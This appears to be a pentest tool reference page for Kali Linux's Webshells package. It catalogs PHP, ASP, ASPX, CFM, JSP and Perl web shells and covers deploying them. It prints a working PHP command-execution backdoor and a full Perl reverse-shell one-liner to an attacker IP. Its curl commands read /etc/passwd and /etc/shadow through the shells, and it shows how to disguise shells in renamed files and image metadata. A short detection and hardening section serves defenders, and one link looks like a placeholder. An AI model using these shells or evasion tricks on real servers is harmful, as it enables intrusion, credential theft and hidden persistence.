---
title: "Webshells"
category: "Persistence"
tool_name: "Webshells"
version: "1.1"
kali_package: "webshells"
install_size: "71 KB"
language: "Mixed (PHP, ASP, ASPX, CFM, JSP, Perl)"
author: "Kali Linux / Offensive Security"
license: "Varies by shell"
github: ""
kali_url: "https://www.kali.org/tools/webshells/"
mitre_tactic: "persistence"
mitre_tactic_id: "TA0003"
tags: ["persistence", "web-backdoor", "collection", "php", "asp", "jsp", "perl", "cfm"]
date: "2026-07-18"
---

# Webshells — Multi-Language Web Shell Collection

## 1. Overview

**Webshells** is a curated collection of web shell scripts for six server-side platforms: PHP, ASP, ASPX, CFM (ColdFusion), JSP, and Perl. Maintained by Offensive Security and shipped with Kali Linux by default, this package provides a ready-to-deploy library of command-execution, reverse-shell, and backdoor scripts for authorized penetration testing.

Unlike tools that generate custom payloads, Webshells provides pre-written, battle-tested scripts organized by language. Each shell is a single file that can be dropped into a web-accessible directory to provide remote command execution or reverse connectivity.

### Core Capabilities

- **Multi-language coverage:** PHP, ASP, ASPX, CFM, JSP, Perl
- **Command execution shells** for interactive OS-level access
- **Reverse shell payloads** for outbound connections to attacker infrastructure
- **Socket-based shells** using PHP's `socket_*` functions
- **Pre-integrated with SecLists** via symlink to `/usr/share/seclists/Web-Shells`
- **Laudanum integration** via symlink to `/usr/share/laudanum`
- **Zero dependencies:** Each shell is a self-contained file requiring no installation

### When to Use Webshells

- Quick deployment of a known-good web shell during a web application pentest
- Testing WAF/IDS detection capabilities against common shell signatures
- Reverse shell delivery when a PHP file upload vulnerability is discovered
- Educational environments learning about web shell mechanics
- Engagements requiring shells across multiple server-side languages
- Situations where tool-generated shells are detected and pre-written variants are needed
- Lab environments for practicing web exploitation techniques

### Comparison with Generated Shells

| Aspect | Webshells (Pre-written) | Generated (WeBaCoo/weevely) |
|--------|------------------------|----------------------------|
| Customization | Limited (edit source) | High (parameters at generation) |
| Obfuscation | None (raw source) | Built-in obfuscation |
| Modules | None | Multiple post-exploitation modules |
| Deployment speed | Instant (copy and run) | Requires generation step |
| Detection risk | Higher (known signatures) | Lower (polymorphic output) |
| Functionality | Single-purpose | Multi-functional |

---

## 2. Installation

### Kali Linux (Default)

```bash
sudo apt install webshells
```

**Explanation:** Webshells is included in Kali's default, large, and everything metapackages. It installs to `/usr/share/webshells/` with symlinks to SecLists and Laudanum.

### Directory Structure

```bash
tree /usr/share/webshells/
```

```text
/usr/share/webshells/
├── asp/
│   ├── cmd-asp-5.1.asp
│   └── cmdasp.asp
├── aspx/
│   └── cmdasp.aspx
├── cfm/
│   └── cfexec.cfm
├── jsp/
│   ├── cmdjsp.jsp
│   └── jsp-reverse.jsp
├── laudanum -> /usr/share/laudanum
├── perl/
│   ├── perlcmd.cgi
│   └── perl-reverse-shell.pl
├── php/
│   ├── findsock.c
│   ├── php-backdoor.php
│   ├── php-findsock-shell.php
│   ├── php-reverse-shell.php
│   ├── qsd-php-backdoor.php
│   └── simple-backdoor.php
└── seclists -> /usr/share/seclists/Web-Shells
```

### Extended Collection via Symlinks

```bash
ls /usr/share/webshells/seclists/ | head -30
```

**Explanation:** The `seclists` symlink provides access to the full SecLists Web-Shells collection (hundreds of shells across languages). The `laudanum` symlink adds the Laudanum post-exploitation toolkit's web shells.

### SecLists Shell Categories

```bash
# Browse available categories
ls /usr/share/seclists/Web-Shells/

# PHP shells from SecLists
ls /usr/share/seclists/Web-Shells/PHP/

# ASP shells from SecLists
ls /usr/share/seclists/Web-Shells/ASP/

# JSP shells from SecLists
ls /usr/share/seclists/Web-Shells/JSP/
```

---

## 3. Shell Catalog

### 3.1 PHP Shells

#### simple-backdoor.php

The most minimal PHP web shell. Accepts a `cmd` parameter via GET or POST, executes it via `shell_exec()`, and wraps output in `<pre>` tags for readability.

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

```bash
curl "http://192.168.1.50/simple-backdoor.php?cmd=id"
curl "http://192.168.1.50/simple-backdoor.php?cmd=cat+/etc/passwd"
curl "http://192.168.1.50/simple-backdoor.php?cmd=ls+-la+/var/www"
curl "http://192.168.1.50/simple-backdoor.php?cmd=uname+-a"
curl "http://192.168.1.50/simple-backdoor.php?cmd=find+/+-perm+-4000+2>/dev/null"
```

**Caveat:** This shell is the most commonly deployed and the most frequently detected. WAF rules often include signatures for `shell_exec` combined with `$_REQUEST`.

#### php-reverse-shell.php

PHP reverse shell by pentestmonkey. Connects back to the attacker's machine on the specified IP and port, providing a fully interactive OS shell.

```bash
# 1. Edit the script
vim /usr/share/webshells/php/php-reverse-shell.php
# Set: $ip = '192.168.1.100'     (attacker IP)
# Set: $port = 4444               (attacker listener port)

# 2. Start listener on attacker machine
nc -lvnp 4444

# 3. Upload and trigger
curl http://192.168.1.50/php-reverse-shell.php
```

**Caveat:** PHP's `fsockopen()` is required for this shell. If `fsockopen` is in `disable_functions`, the shell will fail silently. Also, the connection is unencrypted — anyone sniffing the network can capture the shell session.

#### php-backdoor.php

Another minimal PHP backdoor variant with similar functionality to `simple-backdoor.php`.

```bash
curl "http://192.168.1.50/php-backdoor.php?cmd=whoami"
curl -X POST -d "cmd=id" http://192.168.1.50/php-backdoor.php
```

#### php-findsock-shell.php

A PHP shell that communicates over a raw TCP socket rather than HTTP. The `findsock.c` helper must be compiled on the target system.

```bash
# Compile the socket helper (on attacker, then upload)
gcc -o /usr/share/webshells/php/findsock /usr/share/webshells/php/findsock.c
# Upload findsock binary + PHP shell to target
# Connect via: nc -v attacker_ip port
```

**Explanation:** Useful when HTTP-based shells are detected by WAF rules but raw socket connections are permitted. Requires a C compiler on the target or pre-compiled binary.

#### qsd-php-backdoor.php

QSD (Quick Shell Dump) PHP backdoor with POST-based command execution.

```bash
curl -X POST -d "cmd=whoami" http://192.168.1.50/qsd-php-backdoor.php
curl -X POST -d "cmd=cat /etc/shadow" http://192.168.1.50/qsd-php-backdoor.php
```

#### SecLists Additional PHP Shells

```bash
# Browse more PHP shells
ls /usr/share/seclists/Web-Shells/PHP/

# Notable additions:
# b374k.php       - Full-featured PHP shell with file manager
# c99.php         - Classic PHP shell with extensive features
# r57.php         - Another feature-rich PHP shell
# weevy.php       - Weevely-compatible shell
```

### 3.2 ASP Shells

#### cmdasp.asp

ASP command-execution shell for IIS web servers. Accepts a `cmd` parameter and executes OS commands via WScript.Shell.

```text
http://192.168.1.50/cmdasp.asp?cmd=dir
http://192.168.1.50/cmdasp.asp?cmd=whoami
http://192.168.1.50/cmdasp.asp?cmd=net+user
http://192.168.1.50/cmdasp.asp?cmd=type+C:\inetpub\wwwroot\web.config
```

**Requirements:** IIS with Active Server Pages (ASP) enabled. The application pool identity must have permission to execute OS commands.

#### cmd-asp-5.1.asp

ASP shell variant targeting IIS 5.1 (Windows XP / Server 2003). Uses a different execution method optimized for older IIS versions.

```text
http://192.168.1.50/cmd-asp-5.1.asp?cmd=whoami
http://192.168.1.50/cmd-asp-5.1.asp?cmd=net+localgroup+administrators
```

**Caveat:** IIS 5.1 is end-of-life. This shell is primarily useful for legacy systems in air-gapped or industrial environments.

### 3.3 ASPX Shell

#### cmdasp.aspx

ASP.NET command-execution shell using `System.Diagnostics.Process` to execute commands.

```text
http://192.168.1.50/cmdasp.aspx?cmd=whoami
http://192.168.1.50/cmdasp.aspx?cmd=type+C:\Windows\System32\drivers\etc\hosts
http://192.168.1.50/cmdasp.aspx?cmd=ipconfig+/all
```

**Requirements:** ASP.NET enabled on IIS. The application pool identity must have command execution permissions.

### 3.4 ColdFusion Shell

#### cfexec.cfm

ColdFusion Markup Language shell for servers running Adobe ColdFusion. Executes OS commands via the `<cfexecute>` tag.

```text
http://192.168.1.50/cfexec.cfm?cmd=ls -la
http://192.168.1.50/cfexec.cfm?cmd=cat /etc/passwd
http://192.168.1.50/cfexec.cfm?cmd=whoami
```

**Requirements:** Adobe ColdFusion with `<cfexecute>` enabled (disabled by default in hardened installations).

### 3.5 JSP Shells

#### cmdjsp.jsp

JSP command-execution shell for Java-based web servers (Tomcat, JBoss, WebLogic).

```text
http://192.168.1.50/cmdjsp.jsp?cmd=id
http://192.168.1.50/cmdjsp.jsp?cmd=ls -la /opt/tomcat/
http://192.168.1.50/cmdjsp.jsp?cmd=cat /etc/passwd
```

**Requirements:** Java web server with JSP execution enabled. The servlet container's security policy must allow `Runtime.getRuntime().exec()`.

#### jsp-reverse.jsp

JSP reverse shell that connects back to the attacker from a Java web server.

```bash
# Configure attacker IP/port in the JSP file
# Start listener
nc -lvnp 4444
# Trigger the shell via browser or curl
curl http://192.168.1.50/jsp-reverse.jsp
```

### 3.6 Perl Shells

#### perlcmd.cgi

Perl command-execution CGI shell for servers with Perl CGI enabled.

```text
http://192.168.1.50/perlcmd.cgi?cmd=whoami
http://192.168.1.50/perlcmd.cgi?cmd=ls -la /var/www/cgi-bin/
```

#### perl-reverse-shell.pl

One-liner Perl reverse shell that can be injected through command-injection vulnerabilities.

```bash
perl -e 'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Explanation:** Can be injected through command-injection vulnerabilities without uploading a file. The attacker must run `nc -lvnp 4444` to receive the connection.

---

## 4. Deployment Strategies

### Direct Upload

```bash
# Upload via SCP
scp /usr/share/webshells/php/simple-backdoor.php user@192.168.1.50:/var/www/html/

# Upload via curl (file upload vulnerability)
curl -F "file=@/usr/share/webshells/php/simple-backdoor.php" \
  http://192.168.1.50/upload.php
```

### Obfuscated Deployment

```bash
# Rename to blend with legitimate files
cp /usr/share/webshells/php/simple-backdoor.php \
   /var/www/html/images/config.php.bak

# Embed in image upload
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg

# Double extension bypass
cp /usr/share/webshells/php/simple-backdoor.php /var/www/html/uploads/image.php.jpg
```

**Explanation:** Renaming or embedding shells in legitimate-looking files evades basic filename-based filtering. `exiftool` injects PHP code into image metadata that some misconfigured servers will execute.

### Using with Metasploit

```bash
msfconsole
use auxiliary/multi/http/php_include
set PAYLOAD php/reverse_php
set RHOSTS 192.168.1.50
set LHOST 192.168.1.100
exploit
```

### Chaining with Exploits

```bash
# After exploiting a file upload vulnerability
# Use msfvenom to generate a PHP payload
msfvenom -p php/reverse_php LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

# Upload via the vulnerability
# Start listener
nc -lvnp 4444
```

---

## 5. Language-Specific Considerations

| Language | Server Requirement | Common Path | Key Functions | Port |
|----------|-------------------|-------------|---------------|------|
| PHP | PHP-enabled web server | `/var/www/html/` | `system()`, `exec()`, `shell_exec()` | 80/443 |
| ASP | IIS with ASP enabled | `C:\inetpub\wwwroot\` | `WScript.Shell`, `Scripting.FileSystemObject` | 80/443 |
| ASPX | IIS with ASP.NET | `C:\inetpub\wwwroot\` | `System.Diagnostics.Process` | 80/443 |
| CFM | Adobe ColdFusion | `/var/www/cfml/` | `<cfexecute>` | 80/443/8500 |
| JSP | Tomcat/JBoss/WebLogic | `/var/lib/tomcat/webapps/` | `Runtime.getRuntime().exec()` | 8080/8443 |
| Perl | Perl CGI enabled | `/var/www/cgi-bin/` | `system()`, backtick operator | 80/443 |

---

## 6. Detection and Defense

### File Hash Signatures

```bash
# Calculate hashes for known shells
md5sum /usr/share/webshells/php/*.php
md5sum /usr/share/webshells/asp/*.asp
md5sum /usr/share/webshells/jsp/*.jsp
```

### Content-Based Detection

```bash
# Search for common web shell patterns
grep -rn "system\|exec\|passthru\|shell_exec\|eval.*base64" /var/www/html/ --include="*.php"
grep -rn "WScript\.Shell\|Scripting\.FileSystemObject" /var/www/html/ --include="*.asp"
grep -rn "Runtime\.getRuntime\|ProcessBuilder" /var/www/html/ --include="*.jsp"
grep -rn "cfexecute\|cfparam.*cmd" /var/www/html/ --include="*.cfm"

# Find PHP files with request parameter access and execution
grep -rn 'REQUEST.*system\|REQUEST.*exec\|REQUEST.*passthru' /var/www/html/ --include="*.php"
```

### Size-Based Anomaly Detection

```bash
# Web shells are often very small files
find /var/www/html -name "*.php" -size -5k -exec ls -la {} \;

# Find PHP files with very few lines
find /var/www/html -name "*.php" -exec wc -l {} \; | awk '$1 < 10'
```

### Network-Level Detection

- Monitor HTTP responses for `<pre>` tags wrapping command output
- Flag HTTP requests with `cmd`, `exec`, `command` parameters
- Alert on `Set-Cookie` headers containing Base64-encoded data
- Track connections to unusual outbound ports (reverse shells: 4444, 1234, etc.)

### Preventive Measures

- **`disable_functions`** in `php.ini`: block `system`, `exec`, `passthru`, `shell_exec`, `popen`, `proc_open`
- **`open_basedir`** restriction: limit PHP file access to the web root
- **File upload validation:** check MIME type, file extension, and content
- **WAF rules:** block known shell signatures and command-execution patterns
- **Least privilege:** run web servers as non-root, restrict file write permissions
- **Regular file integrity checks** on web-root directories
- **Application whitelisting** on web servers
- **Network segmentation** to limit outbound connections from web servers

---

## 7. Comparison Matrix

| Shell | Language | Type | Interactivity | Stealth | Ease of Use | Dependencies |
|-------|----------|------|--------------|---------|-------------|-------------|
| simple-backdoor.php | PHP | CMD exec | Low (one-shot) | Medium | Very High | None |
| php-reverse-shell.php | PHP | Reverse shell | High | Low | High | None |
| php-findsock-shell.php | PHP | Socket shell | High | High | Low | C compiler |
| php-backdoor.php | PHP | CMD exec | Low | Medium | High | None |
| qsd-php-backdoor.php | PHP | CMD exec | Low | Medium | High | None |
| cmdasp.asp | ASP | CMD exec | Medium | Medium | High | IIS ASP |
| cmd-asp-5.1.asp | ASP | CMD exec | Medium | Medium | High | IIS 5.1 |
| cmdasp.aspx | ASPX | CMD exec | Medium | Medium | High | IIS ASP.NET |
| cmdjsp.jsp | JSP | CMD exec | Medium | Medium | High | Java server |
| jsp-reverse.jsp | JSP | Reverse shell | High | Low | High | Java server |
| perlcmd.cgi | Perl | CMD exec | Medium | Medium | High | Perl CGI |
| perl-reverse-shell.pl | Perl | Reverse shell | High | Low | Medium | Perl |

---

## 8. Operational Considerations

### Choosing the Right Shell

- **PHP servers:** Use `simple-backdoor.php` for quick access, `php-reverse-shell.php` when HTTP-only shells are blocked
- **IIS servers:** Use `cmdasp.asp` for legacy IIS, `cmdasp.aspx` for modern .NET environments
- **Java servers:** Use `cmdjsp.jsp` for command execution, `jsp-reverse.jsp` for reverse connectivity
- **Perl CGI:** Use `perlcmd.cgi` when other languages are unavailable
- **Multi-language targets:** Start with PHP (most common), fall back to language-specific shells

### Integration with Other Tools

```bash
# Combine with nmap for initial discovery
nmap -sV --script http-shellshock 192.168.1.0/24

# Use with wfuzz for parameter fuzzing
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  http://192.168.1.50/shell.php?FUZZ=id

# Chain with privilege escalation
# After getting shell access via web shell, escalate with:
# linux-exploit-suggester, LinPEAS, or Windows exploit suggester

# Use with Metasploit post modules
use post/multi/recon/local_exploit_suggester
```

### Cleanup

```bash
# Remove uploaded shells after engagement
ssh user@192.168.1.50 "rm /var/www/html/simple-backdoor.php"

# Verify removal
curl -s -o /dev/null -w "%{http_code}" http://192.168.1.50/simple-backdoor.php
# Should return 404

# Verify filesystem-level removal
ssh user@192.168.1.50 "ls -la /var/www/html/simple-backdoor.php"
# Should return "No such file or directory"
```

**Explanation:** Always remove deployed web shells after the engagement. A `404` response confirms the shell is no longer accessible. Verify filesystem-level deletion as well, since a `404` from the web server does not guarantee the file is removed from disk.

---

## Resources

- **Kali Linux Tool Page:** https://www.kali.org/tools/webshells/
- **SecLists Web-Shells:** https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
- **Laudanum Project:** https://github.com/yourname/laudanum (symlinked at `/usr/share/laudanum`)
- **MITRE ATT&CK Persistence (TA0003):** https://attack.mitre.org/tactics/TA0003/
- **MITRE ATT&CK Web Shell (T1505.003):** https://attack.mitre.org/techniques/T1505/003/
- **OffSec PEN-200 Course:** https://www.offsec.com/courses/pen-200/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **PHP Security Manual:** https://www.php.net/manual/en/security.php
